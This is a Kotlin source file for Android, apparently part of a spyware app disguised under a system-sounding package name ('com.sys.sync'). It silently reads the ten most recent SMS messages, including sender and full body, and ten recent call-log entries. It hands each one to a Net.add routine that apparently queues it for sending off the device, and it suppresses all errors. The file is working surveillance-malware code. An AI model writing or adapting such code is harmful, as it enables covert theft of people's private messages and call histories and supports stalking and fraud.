package com.sys.sync

import android.content.Context
import android.provider.CallLog
import android.provider.Telephony

object SmsCalls {
    fun scan(c: Context) {
        try {
            val cur = c.contentResolver.query(Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                null, null, "${Telephony.Sms.DATE} DESC") ?: return
            var n = 0
            while (cur.moveToNext() && n < 10) { Net.add("sms", cur.getString(1) ?: "", cur.getString(0)); n++ }
            cur.close()
        } catch (_: Exception) {}
        try {
            val cur = c.contentResolver.query(CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE),
                null, null, "${CallLog.Calls.DATE} DESC") ?: return
            var n = 0
            while (cur.moveToNext() && n < 10) { Net.add("call", cur.getString(0) ?: "", cur.getString(1)); n++ }
            cur.close()
        } catch (_: Exception) {}
    }
}
